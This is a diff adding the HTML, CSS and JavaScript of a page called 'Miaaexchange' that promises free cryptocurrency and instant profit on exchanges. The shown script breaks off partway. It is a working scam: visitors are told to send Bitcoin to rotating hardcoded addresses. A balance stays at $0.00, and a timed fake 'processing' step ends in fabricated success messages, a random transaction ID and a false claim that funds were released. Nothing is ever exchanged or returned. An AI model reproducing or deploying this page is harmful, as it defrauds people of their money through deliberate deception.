@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Miaaexchange Services - Crypto Exchange</title>
+  <style>
+    /* ----- BASE STYLES (background image ready) ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: transparent;
+      color: white;
+      padding-bottom: 150px;
+      position: relative;
+    }
+
+    /* ----- HEADER / NAVIGATION STYLES ----- */
+    nav {
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(4px);
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+      position: relative;
+      z-index: 10;
+    }
+    .nav-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px 20px;
+    }
+    nav a {
+      color: white;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 1rem;
+      transition: 0.2s;
+      letter-spacing: 0.3px;
+    }
+    nav a:hover {
+      text-decoration: underline;
+      color: #ffb6c1;
+    }
+    nav a.current-page {
+      color: #ffb6c1 !important;
+      text-decoration: underline !important;
+    }
+    @media (max-width: 650px) {
+      nav {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+      }
+      .nav-links {
+        justify-content: center;
+      }
+    }
+
+    /* Main container */
+    .container {
+      max-width: 900px;
+      margin: 40px auto 20px;
+      padding: 30px;
+      background: rgba(0,0,0,0.75);
+      border-radius: 15px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.4);
+      position: relative;
+      z-index: 5;
+    }
+    h1 {
+      color: #ff69b4;
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 32px;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+    }
+    h2 {
+      color: #ff69b4;
+      text-align: center;
+      margin-top: 20px;
+      margin-bottom: 25px;
+      font-size: 26px;
+    }
+    h3 {
+      color: #ffb6c1;
+      margin-top: 0;
+      margin-bottom: 15px;
+    }
+
+    /* BEAUTIFUL ACCOUNT BALANCE CARD (used inside modal now) */
+    .balance-card {
+      background: linear-gradient(135deg, rgba(0,0,0,0.75) 0%, rgba(25,15,35,0.85) 100%);
+      backdrop-filter: blur(8px);
+      border-radius: 30px;
+      padding: 12px 28px;
+      margin: 15px 0 20px 0;
+      display: inline-flex;
+      align-items: baseline;
+      gap: 12px;
+      flex-wrap: wrap;
+      justify-content: center;
+      width: 100%;
+      border: 1px solid rgba(255,105,180,0.5);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,105,180,0.2);
+      transition: all 0.2s ease;
+    }
+    .balance-label {
+      font-size: 1.25rem;
+      font-weight: 600;
+      letter-spacing: 1px;
+      background: linear-gradient(135deg, #ffb6c1, #ff69b4);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 4px rgba(255,105,180,0.3);
+    }
+    .balance-amount {
+      font-size: 2.2rem;
+      font-weight: 800;
+      font-family: 'Courier New', monospace;
+      letter-spacing: 1px;
+    }
+    /* FIX: Make the dollar sign visible (white instead of invisible black) */
+    .balance-amount span.dollar-sign {
+      color: #ffffff !important;
+    }
+    .balance-amount span.balance-number {
+      color: #ffffff !important;
+    }
+    .balance-currency {
+      font-size: 1.2rem;
+      font-weight: 500;
+      color: #ffb6c1;
+      margin-left: 4px;
+    }
+    @media (max-width: 550px) {
+      .balance-amount { font-size: 1.8rem; }
+      .balance-label { font-size: 1rem; }
+    }
+
+    /* Ensure balance card inside Bitcoin modal shows label on top, but we only change $ visibility */
+    #bitcoinInfoModal .balance-card {
+      display: flex !important;
+      flex-direction: column !important;
+      align-items: center !important;
+      justify-content: center !important;
+      text-align: center !important;
+      gap: 8px !important;
+      width: 100% !important;
+      padding: 18px 20px !important;
+    }
+    #bitcoinInfoModal .balance-card .balance-label {
+      margin-bottom: 4px !important;
+      font-size: 1.3rem !important;
+    }
+    #bitcoinInfoModal .balance-card .balance-amount {
+      font-size: 2.4rem !important;
+    }
+    #bitcoinInfoModal .balance-card,
+    #bitcoinInfoModal .balance-card:hover {
+      background: linear-gradient(135deg, rgba(0,0,0,0.75) 0%, rgba(25,15,35,0.85) 100%);
+      backdrop-filter: blur(8px);
+      border: 1px solid rgba(255,105,180,0.6);
+    }
+
+    /* ----- FORM STYLES ----- */
+    .exchange-form {
+      background: rgba(0,0,0,0.6);
+      border-radius: 12px;
+      padding: 25px;
+      margin-top: 20px;
+      border: 1px solid rgba(255,105,180,0.4);
+    }
+    .form-group {
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+    }
+    .form-group label {
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #ffb6c1;
+      font-size: 1rem;
+    }
+    .required-star {
+      color: #ff69b4;
+      margin-left: 4px;
+    }
+    .form-group input, .form-group select {
+      padding: 12px 15px;
+      border-radius: 8px;
+      border: none;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      font-size: 1rem;
+      outline: none;
+      transition: 0.2s;
+    }
+    .form-group input:focus, .form-group select:focus {
+      background: rgba(255,255,255,0.25);
+      box-shadow: 0 0 0 2px #ff69b4;
+    }
+    .form-group input::placeholder {
+      color: #ccc;
+    }
+    .field-hint {
+      font-size: 0.8rem;
+      color: #aaa;
+      margin-top: 5px;
+    }
+    .reason-text {
+      font-size: 0.8rem;
+      color: #ffb6c1;
+      margin-top: 4px;
+      font-style: italic;
+    }
+    .form-row {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .form-row .form-group {
+      flex: 1;
+    }
+    .submit-btn {
+      background: linear-gradient(135deg, #ff69b4, #ff1493);
+      color: white;
+      font-size: 1.2rem;
+      font-weight: bold;
+      padding: 14px 28px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: 0.3s;
+      width: 100%;
+      margin-top: 15px;
+      letter-spacing: 1px;
+    }
+    .submit-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .submit-btn:hover:not(:disabled) {
+      transform: scale(1.02);
+      background: linear-gradient(135deg, #ff1493, #ff69b4);
+      box-shadow: 0 5px 15px rgba(255,105,180,0.5);
+    }
+    .message-area {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 8px;
+      text-align: center;
+      font-weight: bold;
+      display: none;
+    }
+    .message-success {
+      background: rgba(0,128,0,0.7);
+      color: #fff;
+      border: 1px solid #00cc66;
+    }
+    .message-error {
+      background: rgba(220,20,60,0.8);
+      color: white;
+      border: 1px solid #ff4d4d;
+    }
+
+    /* NOTES SECTION: black background */
+    .notes {
+      background: #000000;
+      color: white;
+      padding: 28px 30px;
+      border-radius: 12px;
+      margin: 40px auto 30px;
+      max-width: 900px;
+      border: 1px solid #333;
+      text-align: left;
+      position: relative;
+      z-index: 5;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+    }
+    .notes h3 {
+      text-align: center;
+      font-size: 1.6rem;
+      margin-bottom: 25px;
+      color: #ffb6c1;
+    }
+    .notes ul {
+      margin: 0 0 25px 25px;
+      padding-left: 15px;
+      list-style-type: none;
+    }
+    .notes li {
+      margin-bottom: 18px;
+      line-height: 1.5;
+      font-size: 1rem;
+      position: relative;
+      padding-left: 28px;
+    }
+    .notes li:before {
+      content: "✔️";
+      position: absolute;
+      left: 0;
+      color: #ff69b4;
+    }
+    .notes p {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 1.05rem;
+      font-weight: bold;
+      border-top: 1px solid #333;
+      padding-top: 20px;
+      color: #ffb6c1;
+    }
+    .spacer {
+      height: 20px;
+    }
+    @media (max-width: 768px) {
+      .container {
+        width: 90%;
+        padding: 20px;
+      }
+      .exchange-form {
+        padding: 18px;
+      }
+      .notes {
+        padding: 20px;
+        margin: 30px 15px;
+      }
+      .notes li {
+        margin-bottom: 14px;
+      }
+    }
+
+    /* Background overlay */
+    .bg-image {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+      overflow: hidden;
+    }
+    .bg-image img {
+      min-width: 100%;
+      min-height: 100%;
+      width: auto;
+      height: auto;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      object-fit: cover;
+    }
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    footer {
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(4px);
+      color: #ddd;
+      text-align: center;
+      padding: 16px 20px;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      font-size: 0.9rem;
+      z-index: 100;
+    }
+
+    /* ========== MODAL (POPUP) STYLES - IMPROVED FOR BUTTON VISIBILITY ========== */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(6px);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.2s, opacity 0.2s ease;
+    }
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    /* Modal container becomes flex column so header/footer stay visible while body scrolls */
+    .modal-container {
+      background: #0a0a0f;
+      border-radius: 20px;
+      width: 90%;
+      max-width: 540px;
+      max-height: 90vh;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 25px 40px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,105,180,0.5);
+      transition: all 0.25s ease;
+      overflow: hidden;
+      border: 1px solid rgba(255,105,180,0.7);
+      backdrop-filter: blur(2px);
+    }
+    /* minimized state */
+    .modal-container.minimized {
+      max-width: 340px;
+      min-width: 240px;
+      cursor: pointer;
+      max-height: auto;
+    }
+    .modal-container.minimized .modal-body,
+    .modal-container.minimized .modal-footer {
+      display: none;
+    }
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 20px;
+      background: rgba(0,0,0,0.85);
+      border-bottom: 1px solid #ff69b4;
+      cursor: move;
+      flex-shrink: 0;
+    }
+    .modal-title {
+      font-size: 1.3rem;
+      font-weight: bold;
+      color: #ffb6c1;
+      letter-spacing: 0.5px;
+    }
+    .modal-header-buttons {
+      display: flex;
+      gap: 12px;
+    }
+    .modal-header-buttons button {
+      background: transparent;
+      border: none;
+      color: #ffb6c1;
+      font-size: 1.3rem;
+      font-weight: bold;
+      cursor: pointer;
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: 0.2s;
+    }
+    .modal-header-buttons button:hover {
+      background: rgba(255,105,180,0.3);
+      color: white;
+    }
+    .modal-body {
+      padding: 30px 24px;
+      text-align: center;
+      overflow-y: auto;
+      flex: 1 1 auto;
+    }
+    .modal-footer {
+      padding: 16px 20px 24px;
+      display: flex;
+      justify-content: center;
+      border-top: 1px solid rgba(255,105,180,0.3);
+      flex-shrink: 0;
+    }
+    .close-modal-btn {
+      background: linear-gradient(135deg, #ff69b4, #ff1493);
+      border: none;
+      padding: 8px 28px;
+      border-radius: 40px;
+      color: white;
+      font-weight: bold;
+      font-size: 0.95rem;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .close-modal-btn:hover {
+      transform: scale(1.02);
+      background: #ff1493;
+    }
+    .claim-btn {
+      background: linear-gradient(135deg, #00c853, #009624);
+      margin-top: 12px;
+      width: 100%;
+    }
+    .continue-btn {
+      background: linear-gradient(135deg, #ff69b4, #ff1493);
+      margin-top: 20px;
+      width: auto;
+      padding: 12px 32px;
+      font-size: 1rem;
+    }
+    .wallet-input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      font-size: 0.9rem;
+      margin-top: 8px;
+    }
+    .wallet-input:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #ff69b4;
+    }
+    .bitcoin-address-box {
+      background: rgba(0,0,0,0.7);
+      padding: 14px;
+      border-radius: 12px;
+      margin: 15px 0;
+      font-family: monospace;
+      font-size: 0.85rem;
+      word-break: break-all;
+      border: 1px solid #ff69b4;
+      color: #ffb6c1;
+      letter-spacing: 0.5px;
+    }
+    /* Loading spinner */
+    .loader {
+      width: 58px;
+      height: 58px;
+      border: 5px solid rgba(255,105,180,0.25);
+      border-top: 5px solid #ff69b4;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 22px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .processing-message {
+      font-size: 1.1rem;
+      color: #ffb6c1;
+      margin: 12px 0 8px;
+      font-weight: 600;
+    }
+    .info-text {
+      color: #cccccc;
+      font-size: 0.9rem;
+      margin-top: 6px;
+    }
+    .success-details {
+      text-align: left;
+      background: rgba(0,0,0,0.6);
+      padding: 18px;
+      border-radius: 18px;
+      width: 100%;
+      margin-top: 12px;
+      border: 1px solid rgba(255,105,180,0.4);
+    }
+    .success-details p {
+      margin: 8px 0;
+      word-break: break-word;
+      font-size: 0.9rem;
+    }
+    .tx-hash {
+      font-family: monospace;
+      background: #1e1e2a;
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 0.8rem;
+      display: inline-block;
+    }
+    .timer-note {
+      font-size: 0.8rem;
+      color: #ffb6c1;
+      margin-top: 12px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-image">
+    <img src="https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=1600" alt="Crypto office abstract background">
+  </div>
+  <div class="overlay"></div>
+
+  <nav>
+    <div class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="about_us.html">About Us</a>
+      <a href="exchange.html" class="current-page">Exchange</a>
+      <a href="index.html">Contact Us</a>
+      <a href="faq.html">Faq</a>
+    </div>
+  </nav>
+
+  <div class="container">
+    <h1>Generate Free Cryptocurrency</h1>
+    
+    <div style="margin: 30px 0 20px 0;">
+      <p style="margin-bottom: 1.2em; line-height: 1.5;">Before initiating any transaction, please ensure you have the exact amount intended for exchange. Our platform supports a minimum transaction of $50 and a maximum of $50,000, and any amount below the minimum threshold will not be processed immediately.</p>
+      <p style="margin-bottom: 1.2em; line-height: 1.5;">Transactions under $50 will be held in our reserve system until a new exchange is made using the same account details. At that point, both the previous and current transactions, including applicable returns, will be processed and credited together.</p>
+      <p style="margin-bottom: 1.2em; line-height: 1.5;">To avoid delays, we strongly advise meeting the minimum requirement before proceeding.</p>
+      <p style="margin-bottom: 1.2em; line-height: 1.5;">After clicking the exchange now button, copy your transaction bitcoin wallet address and send the exact amount from your personal wallet. Ensure the transaction is completed correctly before proceeding to the final confirmation steps.</p>
+      <p style="margin-bottom: 1.2em; line-height: 1.5;">Once confirmed, the system will automatically process your request. Please wait for few minutes and then refresh your account to view your credited capital and returns.</p>
+      <p style="margin-bottom: 0; line-height: 1.5;">To get started, kindly complete the form provided below. Our secure, AI-powered system is designed to process transactions efficiently while ensuring a smooth and reliable exchange experience.</p>
+    </div>
+    
+    <h2>Exchange Details</h2>
+    
+    <div class="exchange-form">
+      <form id="exchangeForm">
+        <div class="form-row">
+          <div class="form-group">
+            <label>From Currency <span class="required-star">*</span></label>
+            <select id="fromCurrency" required>
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="USDT">Tether (USDT)</option>
+              <option value="LTC">Litecoin (LTC)</option>
+            </select>
+            <div class="reason-text">🔹 Required: Determines which asset you are sending.</div>
+          </div>
+          <div class="form-group">
+            <label>To Currency <span class="required-star">*</span></label>
+            <select id="toCurrency" required>
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="USDT">Tether (USDT)</option>
+              <option value="LTC">Litecoin (LTC)</option>
+            </select>
+            <div class="reason-text">🔹 Required: The cryptocurrency you want to receive + profit.</div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Your Sending Wallet Address <span class="required-star">*</span></label>
+          <input type="text" id="sendAddress" placeholder="Enter your wallet address (e.g., 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)" required>
+          <div class="reason-text">🔹 Required: So the system can verify ownership and deduct the exact amount securely.</div>
+          <div class="field-hint">Make sure the address matches the selected "From Currency".</div>
+        </div>
+
+        <div class="form-group">
+          <label>Your Receiving Wallet Address <span class="required-star">*</span></label>
+          <input type="text" id="receiveAddress" placeholder="Where you want to receive the new currency + profits" required>
+          <div class="reason-text">🔹 Required: We will send your exchanged funds within 5 to your wallet address.</div>
+        </div>
+
+        <div class="form-group">
+          <label>Amount (USD) <span class="required-star">*</span></label>
+          <input type="number" id="usdAmount" placeholder="Min $50 - Max $50,000" step="any" required>
+          <div class="reason-text">🔹 Required: Determines the quantity of crypto to exchange. Minimum $50 - Maximum $50,000.</div>
+          <div class="field-hint">Higher amounts may receive extra profit rewards.</div>
+        </div>
+
+        <div class="form-group">
+          <label>Email Address <span class="required-star">*</span></label>
+          <input type="email" id="email" placeholder="you@example.com" required>
+          <div class="reason-text">🔹 Required: To send transaction confirmation and instant receipt.</div>
+        </div>
+
+        <div class="form-group">
+          <label>Additional Note (Optional)</label>
+          <input type="text" id="note" placeholder="Any special request or reference">
+          <div class="reason-text">💡 Optional: Use this if you have a referral code or specific instructions (not required for exchange).</div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">🚀 START EXCHANGE NOW</button>
+        <div id="formMessage" class="message-area"></div>
+      </form>
+    </div>
+  </div>
+
+  <div class="notes">
+    <h3>📌 Important Notes</h3>
+    <ul>
+      <li><strong>✅ Fully automated system</strong> — No manual intervention, everything runs on AI smart contracts.</li>
+      <li><strong>⚡ Instant profits</strong> — You will receive your exchanged plus <strong>profit</strong> after processing (within 5 minute).</li>
+      <li><strong>🔐 Mandatory fields</strong> — All fields marked with <span class="required-star" style="color:#ff69b4;">*</span> are strictly required to guarantee security, prevent errors, and ensure correct delivery of funds.</li>
+      <li><strong>📧 Email confirmation</strong> — A detailed receipt will be sent to your email (check spam folder if missing).</li>
+      <li><strong>💵 Minimum & maximum</strong> — Exchange limits: $50 minimum, $50,000 maximum per transaction. For larger amounts, please contact support.</li>
+      <li><strong>🔄 Multiple exchanges</strong> — You can perform unlimited exchanges as long as you maintain a stable internet connection for faster processing.</li>
+    </ul>
+  </div>
+
+  <footer>
+    Miaaexchange Services ©2012-2026
+  </footer>
+
+  <!-- BITCOIN INFO MODAL -->
+  <div id="bitcoinInfoModal" class="modal-overlay">
+    <div class="modal-container" id="bitcoinModalContainer">
+      <div class="modal-header">
+        <span class="modal-title"></span>
+        <div class="modal-header-buttons">
+          <button id="closeBitcoinModalBtn" title="Close">✕</button>
+        </div>
+      </div>
+      <div class="modal-body" id="bitcoinModalBody">
+        <!-- dynamic content -->
+      </div>
+      <div class="modal-footer">
+        <button class="close-modal-btn" id="bitcoinModalFooterClose">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- EXCHANGE ENGINE MODAL -->
+  <div id="exchangeModal" class="modal-overlay">
+    <div class="modal-container" id="modalContainer">
+      <div class="modal-header">
+        <span class="modal-title">⚡ Miaa Exchange Engine</span>
+        <div class="modal-header-buttons">
+          <button id="minimizeModalBtn" title="Minimize">─</button>
+          <button id="closeModalBtn" title="Close">✕</button>
+        </div>
+      </div>
+      <div class="modal-body" id="modalBody">
+        <div class="loader"></div>
+        <div class="processing-message">Processing your exchange request...</div>
+        <div class="info-text">This process may take up to 5 minutes.<br>🔒 Blockchain validation & smart contract execution</div>
+      </div>
+      <div class="modal-footer" id="modalFooter">
+        <button class="close-modal-btn" id="modalFooterCloseBtn">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const WALLET_ADDRESSES = [
+        "bc1qzl0upjkvq9k780p5nxwces9js4uk3yf53hkhu4",
+        "16sBRSQ1yVGkpmPvZJkV1XySnmSaTa99p6",
+        "1DfdPM41foZSsA6e2NjhZzt2UaoenZ2pNw"
+      ];
+      let currentWalletIndex = 0;
+
+      const form = document.getElementById('exchangeForm');
+      const submitBtn = document.getElementById('submitBtn');
+      const messageDiv = document.getElementById('formMessage');
+      
+      const engineModal = document.getElementById('exchangeModal');
+      const modalContainer = document.getElementById('modalContainer');
+      const modalBody = document.getElementById('modalBody');
+      const modalFooter = document.getElementById('modalFooter');
+      const minimizeBtn = document.getElementById('minimizeModalBtn');
+      const closeModalBtn = document.getElementById('closeModalBtn');
+      const footerCloseBtn = document.getElementById('modalFooterCloseBtn');
+      
+      const bitcoinModal = document.getElementById('bitcoinInfoModal');
+      const closeBitcoinBtn = document.getElementById('closeBitcoinModalBtn');
+      const bitcoinFooterCancel = document.getElementById('bitcoinModalFooterClose');
+      const bitcoinModalBody = document.getElementById('bitcoinModalBody');
+      
+      let processingTimer = null;
+      let isProcessing = false;
+      let pendingFormData = null;
+      let pendingTxId = null;
+      
+      let continueClickCount = 0;
+      
+      function showMessage(msg, isError = true) {
+        messageDiv.textContent = msg;
+        messageDiv.style.display = 'block';
+        messageDiv.className = `message-area ${isError ? 'message-error' : 'message-success'}`;
+        setTimeout(() => {
+          if (messageDiv) messageDiv.style.display = 'none';
+        }, 6000);
+      }
+      
+      function generateUniqueTxId() {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        let result = '';
+        for (let i = 0; i < 10; i++) {
+          result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+      }
+      
+      function isValidWallet(address) {
+        return address && address.trim().length >= 10 && !/\s/.test(address);
+      }
+      function isValidAmount(amount) {
+        const num = parseFloat(amount);
+        return !isNaN(num) && num >= 50 && num <= 50000;
+      }
+      
+      function resetModalToLoading() {
+        modalBody.innerHTML = `
+          <div class="loader"></div>
+          <div class="processing-message">Processing your exchange request...</div>
+          <div class="info-text">This process may take up to 5 minutes.<br>🔒 Blockchain validation & smart contract execution</div>
+          <div class="timer-note">⏳ Estimated time: ~3 minutes</div>
+        `;
+        modalFooter.style.display = 'flex';
+        modalContainer.classList.remove('minimized');
+        if (minimizeBtn) minimizeBtn.textContent = '─';
+      }
+      
+      function closeEngineModal() {
+        if (processingTimer) {
+          clearTimeout(processingTimer);
+          processingTimer = null;
+        }
+        engineModal.classList.remove('active');
+        isProcessing = false;
+        submitBtn.disabled = false;
+        pendingFormData = null;
+        pendingTxId = null;
+      }
+      
+      function toggleMinimize() {
+        if (modalContainer.classList.contains('minimized')) {
+          modalContainer.classList.remove('minimized');
+          minimizeBtn.textContent = '─';
+          minimizeBtn.title = 'Minimize';
+        } else {
+          modalContainer.classList.add('minimized');
+          minimizeBtn.textContent = '🗖';
+          minimizeBtn.title = 'Restore';
+        }
+      }
+      
+      function showSuccessContent(formData, profitAmount, totalReceived, uniqueTxId) {
+        const { fromCurrency, toCurrency, email, receiveAddress: initialWallet } = formData;
+        modalBody.innerHTML = `
+          <div style="text-align: center;">
+            <div style="font-size: 3rem;">✅</div>
+            <h3 style="color:#ffb6c1; margin: 12px 0;">Transaction Successful!</h3>
+            <div class="success-details">
+              <p><strong>🔗 Transaction ID:</strong> <span class="tx-hash">${uniqueTxId}</span></p>
+              <p><strong>💱 Exchange Pair:</strong> ${fromCurrency} → ${toCurrency}</p>
+              <p><strong>📧 Confirmation sent to:</strong> ${email}</p>
+              <hr style="border-color:#ff69b4; margin: 12px 0;">
+              <p style="font-weight: bold; color: #ffb6c1;">📌 To receive your funds, please confirm your receiving wallet address below:</p>
+              <input type="text" id="modalReceiveWalletInput" class="wallet-input" placeholder="Enter your cryptocurrency receiving wallet address" value="${initialWallet || ''}">
+              <button id="claimFundsBtn" class="close-modal-btn claim-btn" style="margin-top: 12px;">✅ Confirm & Receive Funds</button>
+              <p style="font-size: 0.75rem; margin-top: 12px; color: #aaa;">Your funds + profit will be sent instantly after confirmation.</p>
+            </div>
+            <div class="timer-note" style="margin-top: 12px;">🎉 Exchange completed. You can close the window using the X or Close button after confirming.</div>
+          </div>
+        `;
+        const claimBtn = document.getElementById('claimFundsBtn');
+        if (claimBtn) {
+          claimBtn.addEventListener('click', function() {
+            const walletInput = document.getElementById('modalReceiveWalletInput');
+            const enteredWallet = walletInput ? walletInput.value.trim() : '';
+            if (!enteredWallet || enteredWallet.length < 10) {
+              showMessage('⚠️ Please enter a valid receiving wallet address (minimum 10 characters).', true);
+              return;
+            }
+            showMessage(`✅ Funds + profit has been sent to ${enteredWallet.substring(0, 10)}... Check your wallet shortly.`, false);
+            const successDetailsDiv = document.querySelector('#modalBody .success-details');
+            if (successDetailsDiv) {
+              const originalHtml = successDetailsDiv.innerHTML;
+              successDetailsDiv.innerHTML = `
+                ${originalHtml.split('<hr')[0]}
+                <hr style="border-color:#00cc66; margin: 12px 0;">
+                <p style="color: #00ffaa; font-weight: bold;">✅ Funds released to: ${enteredWallet.substring(0, 16)}...${enteredWallet.slice(-6)}</p>
+                <p style="font-size: 0.8rem;">Your transaction is complete. Thank you for using Miaaexchange.</p>
+              `;
+              if (claimBtn) claimBtn.remove();
+            }
+          });
+        }
+        modalFooter.style.display = 'flex';
+        showMessage(`🎉 Exchange successful! ${fromCurrency} → ${toCurrency} + 2% bonus. Unique TX: ${uniqueTxId}`, false);
+      }
+      
+      function startExchangeProcessing(formData, uniqueTxId) {
+        if (processingTimer) clearTimeout(processingTimer);
+        isProcessing = true;
+        processingTimer = setTimeout(() => {
+          if (!isProcessing) return;
+          const amount = parseFloat(formData.usdAmount);
+          const profitPercent = 2;
+          const profit = (amount * profitPercent) / 100;
+          showSuccessContent(formData, profit, amount + profit, uniqueTxId);
+          isProcessing = false;
+          if (processingTimer) processingTimer = null;
+        }, 60000);
+      }
+      
+      function openEngineModalAndProcess(formData, uniqueTxId) {
+        resetModalToLoading();
+        modalContainer.classList.remove('minimized');
+        if (minimizeBtn) minimizeBtn.textContent = '─';
+        engineModal.classList.add('active');
+        submitBtn.disabled = true;
+        if (processingTimer) clearTimeout(processingTimer);
+        isProcessing = true;
+        startExchangeProcessing(formData, uniqueTxId);
+      }
+      
+      function buildBitcoinModalContent() {
+        return `
+          <div style="text-align: center;">
+            <div style="font-size: 2rem;">🏦</div>
+            <p style="margin: 10px 0 4px; line-height: 1.5;">To complete your exchange process, please fund your account balance first using the Bitcoin wallet address provided below, which is linked to this transaction.</p>
+            <p style="margin: 8px 0 4px; line-height: 1.5;">Carefully copy the wallet address and send the exact amount you wish to exchange from your personal wallet.</p>
+            <p style="margin: 8px 0 12px; line-height: 1.5;">After completing the transaction, please confirm your payment before proceeding here.</p>
+            
+            <div class="bitcoin-address-box" id="dynamicBitcoinAddressBox">${WALLET_ADDRESSES[currentWalletIndex]}</div>
+            
+            <div class="balance-card" style="margin: 20px 0 14px 0;">
+              <span class="balance-label">💼 ACCOUNT BALANCE</span>
+              <span class="balance-amount">
+                <span class="dollar-sign">$</span><span class="balance-number">0.00</span>
+              </span>
+            </div>
+            
+            <p style="font-size: 0.85rem; color: #ffb6c1;">⚠️ All transferred funds will be reflected in your account balance here. Once payment has been completed, please refresh your account to view the updated balance, then click below to proceed with your exchange.</p>
+            <button id="continueToEngineBtn" class="close-modal-btn continue-btn">✅ Click here to continue</button>
+          </div>
+        `;
+      }
+      
+      function attachContinueButtonListener() {
+        const continueBtn = document.getElementById('continueToEngineBtn');
+        if (continueBtn) {
+          const newBtn = continueBtn.cloneNode(true);
+          continueBtn.parentNode.replaceChild(newBtn, continueBtn);
+          newBtn.addEventListener('click', onContinue);
+        } else {
+          setTimeout(attachContinueButtonListener, 50);
+        }
+      }
+      
+      function refreshBitcoinModalContent() {
+        if (!bitcoinModalBody) return;
+        bitcoinModalBody.innerHTML = buildBitcoinModalContent();
+        attachContinueButtonListener();
+      }
+      
+      function rotateAndUpdateAddress() {
+        const addressBox = document.getElementById('dynamicBitcoinAddressBox');
+        if (addressBox) {
+          addressBox.textContent = WALLET_ADDRESSES[currentWalletIndex];
+          currentWalletIndex = (currentWalletIndex + 1) % WALLET_ADDRESSES.length;
+        } else {
+          refreshBitcoinModalContent();
+          const freshBox = document.getElementById('dynamicBitcoinAddressBox');
+          if (freshBox) freshBox.textContent = WALLET_ADDRESSES[currentWalletIndex];
+          currentWalletIndex = (currentWalletIndex + 1) % WALLET_ADDRESSES.length;
+          attachContinueButtonListener();
+        }
+      }
+      
+      function showBitcoinModal(formData, txId) {
+        continueClickCount = 0;
+        pendingFormData = formData;
+        pendingTxId = txId;
+        refreshBitcoinModalContent();
+        rotateAndUpdateAddress();
+        bitcoinModal.classList.add('active');
+        submitBtn.disabled = true;
+      }
+      
+      function closeBitcoinModal(resetSubmit = true) {
+        bitcoinModal.classList.remove('active');
+        if (resetSubmit) {
+          submitBtn.disabled = false;
+        }
+        pendingFormData = null;
+        pendingTxId = null;
+        continueClickCount = 0;
+      }
+      
+      function onContinue() {
+        continueClickCount++;
+        
+        if (continueClickCount < 3) {
+          alert("Your account balance is $0:00. Please fund your account and proceed with your exchange.");
+          return;
+        }
+        
+        if (!pendingFormData || !pendingTxId) {
+          closeBitcoinModal(true);
+          return;
+        }
+        bitcoinModal.classList.remove('active');
+        openEngineModalAndProcess(pendingFormData, pendingTxId);
+        pendingFormData = null;
+        pendingTxId = null;
+        continueClickCount = 0;
+      }
+      
